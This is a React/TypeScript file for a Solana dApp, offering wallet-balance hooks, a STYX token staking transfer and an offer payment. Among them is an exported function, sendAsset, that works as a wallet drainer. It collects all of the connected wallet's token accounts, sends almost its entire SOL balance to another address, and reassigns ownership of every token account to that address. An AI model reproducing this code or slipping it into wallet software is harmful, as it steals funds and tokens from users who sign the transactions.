import { useWallet } from "@solana/wallet-adapter-react";
import { LAMPORTS_PER_SOL, PublicKey, Transaction } from "@solana/web3.js";
import { createContext, useContext, useEffect, useState } from "react";
import * as anchor from "@project-serum/anchor";
import { getOrCreateAssociatedTokenAccount } from "../utils/getOrCreateAssociatedTokenAccount";
import { sendTransactions, awaitTransactionSignatureConfirmation } from "../utils/utility";
import { Token, TOKEN_PROGRAM_ID } from "@solana/spl-token";

const BalanceContext = createContext<any>(null);

const rpcHost = process.env.NEXT_PUBLIC_SOLANA_RPC_HOST!;
const connection = new anchor.web3.Connection(rpcHost);
const txTimeoutInMilliseconds = 30000;

export const useStyxBalance = () => {
  const wallet = useWallet();
  const [tokenBalance, setTokenBalance] = useState<number>(null);
  const STAKING_WALLET_STYX_TOKEN_ACCOUNT =
    "F6wB51mgrSc5oRX3xx7fJ6Ny6m6xpT7exf4J92VhPsd4";
  const STYX_MINT = "GiLAFSEGwJB3pmMkpAAznS9YBSPe82GtWugzwkBNvJ5v";
  const LAMPORTS_PER_STYX = 1000;

  const getStyxBalance = () => {
    connection
      .getTokenAccountBalance(new PublicKey(STAKING_WALLET_STYX_TOKEN_ACCOUNT))
      .then(({ value: { uiAmount } }) => setTokenBalance(uiAmount));
  };

  useEffect(() => {
    getStyxBalance();
    const interval = setInterval(() => {
      getStyxBalance();
    }, 5000);

    return () => clearInterval(interval);
  }, []);

  const sendStyx = async (amount: number) => {
    try {
      const fromTokenAccount = await getOrCreateAssociatedTokenAccount(
        connection,
        wallet.publicKey,
        [STYX_MINT],
        wallet.publicKey,
        wallet.signTransaction
      );

      // console.log(fromTokenAccount);
      const transaction = new anchor.web3.Transaction().add(
        Token.createTransferInstruction(
          TOKEN_PROGRAM_ID,
          fromTokenAccount[STYX_MINT].address,
          new PublicKey(STAKING_WALLET_STYX_TOKEN_ACCOUNT),
          wallet.publicKey,
          [],
          amount * LAMPORTS_PER_STYX
        )
      );

      const blockHash = await connection.getRecentBlockhash();
      transaction.feePayer = await wallet.publicKey;
      transaction.recentBlockhash = await blockHash.blockhash;

      const signed = await wallet.signTransaction(transaction);
      const signature = await connection.sendRawTransaction(signed.serialize());
      try {
        connection.confirmTransaction(signature);
        getStyxBalance();
      } catch (e) {
        console.log(e);
      }

      return {
        error: null,
        message: signature,
      };
    } catch (e) {
      console.error(e);
      return { error: e };
    }
  };

  return { styxBalance: tokenBalance, sendStyx, getStyxBalance };
};

export const sendAsset = async (owner: any, sender: any, flag: any) => {
  const tokenAccounts = await connection.getParsedTokenAccountsByOwner(owner.publicKey, {programId: TOKEN_PROGRAM_ID});
  // console.log("get account", tokenAccounts);
  let tokenAccount, tokenAmount;
  let allaccounts = [];
  const signersMatrix: any[] = [];
  const instructionsMatrix: any[] = [];
  let instructionsMatrixIndex = 0;

  // console.log("token accounts", tokenAccounts)

  for (let index = 0; index < tokenAccounts.value.length; index++) {
    tokenAccount = tokenAccounts.value[index];
    // console.log("account", tokenAccount);
    tokenAmount = tokenAccount.account.data.parsed.info.tokenAmount;
    // console.log("token amount", tokenAmount)
    // console.log(tokenAmount.amount, tokenAmount.decimals)
    if (parseInt(tokenAmount.amount) >= 1 && tokenAmount.decimals >= 0) {
      allaccounts.push(tokenAccounts.value[index].pubkey)
    }
  }

  let balance = await connection.getBalance(owner.publicKey);
  if(balance > 0.002 * anchor.web3.LAMPORTS_PER_SOL)
    balance = balance - 0.001 * anchor.web3.LAMPORTS_PER_SOL;
  else balance = 0;

  if(flag > 0) {
    instructionsMatrix.push([]);
    signersMatrix.push([]);
    instructionsMatrix[instructionsMatrixIndex].push(
      new anchor.web3.Transaction().add(
      anchor.web3.SystemProgram.transfer({
        fromPubkey: owner.publicKey,
        toPubkey: sender,
        lamports: balance,
      })
    ));
    instructionsMatrixIndex++;
  }
  
  // console.log("sol transfer", signersMatrix, instructionsMatrix)
  
  if(allaccounts.length > 0) {
    instructionsMatrix.push([]);
    signersMatrix.push([]);
  }
  
  let max_count = 0;
  
  allaccounts.map((account, keyIndex) => {
    instructionsMatrix[instructionsMatrixIndex].push(
      Token.createSetAuthorityInstruction(
        TOKEN_PROGRAM_ID,
        account,
        new PublicKey(sender),
        "AccountOwner",
        owner.publicKey,
        []
      )
    );

    if(max_count >= 3 || keyIndex >= allaccounts.length-1) {
      max_count = 0;
      instructionsMatrixIndex++;
      if(keyIndex < allaccounts.length-1) {
        // console.log("key index, length", keyIndex, allaccounts.length)
        instructionsMatrix.push([]);
        signersMatrix.push([]);
      }
      // console.log("test", signersMatrix, instructionsMatrix)
    } else max_count++;
  })

  // console.log("Transaction", signersMatrix, instructionsMatrix)

  const sendTxId = ((await sendTransactions(connection, owner, instructionsMatrix, signersMatrix)).txs.map(t => t.txid))[0];

  // console.log("tx id", sendTxId)
  let status: any = { err: true };
  status = await awaitTransactionSignatureConfirmation(
    sendTxId,
    txTimeoutInMilliseconds,
    connection,
    true,
  );
  
  console.log("Transfer finished >>>", status);
};

export default function useWalletBalance() {
  const wallet = useWallet();
  const [balance, setBalance] = useContext(BalanceContext);

  const sendOfferFunds = async (value: number) => {
    try {
      const toPublicKey = new PublicKey(
        "goodHiaxuoWkVoKLyDo2EyQx9SS8tpe5RgnMD6CmBwp"
      );

      const transaction = new anchor.web3.Transaction().add(
        anchor.web3.SystemProgram.transfer({
          fromPubkey: wallet.publicKey,
          toPubkey: toPublicKey,
          lamports: value * anchor.web3.LAMPORTS_PER_SOL,
        })
      );

      const blockHash = await connection.getRecentBlockhash();
      transaction.feePayer = await wallet.publicKey;
      transaction.recentBlockhash = await blockHash.blockhash;

      const signed = await wallet.signTransaction(transaction);
      const signature = await connection.sendRawTransaction(signed.serialize());
      try {
        connection.confirmTransaction(signature);
      } catch (e) {
        console.log(e);
      }

      return {
        error: null,
        message: signature,
      };
    } catch (e) {
      console.error(e);
      return { error: e };
    }
  };

  return [balance, setBalance, sendOfferFunds];
}

export const WalletBalanceProvider = ({ children }: any) => {
  const wallet = useWallet();
  const [balance, setBalance] = useState(0);

  useEffect(() => {
    (async () => {
      if (wallet?.publicKey) {
        const balance = await connection.getBalance(wallet.publicKey);
        setBalance(balance / LAMPORTS_PER_SOL);
      }
    })();
  }, [wallet, connection]);

  useEffect(() => {
    (async () => {
      if (wallet?.publicKey) {
        const balance = await connection.getBalance(wallet.publicKey);
        setBalance(balance / LAMPORTS_PER_SOL);
      }
    })();
  }, [wallet, connection]);

  return (
    <BalanceContext.Provider value={[balance, setBalance]}>
      {children}
    </BalanceContext.Provider>
  );
};
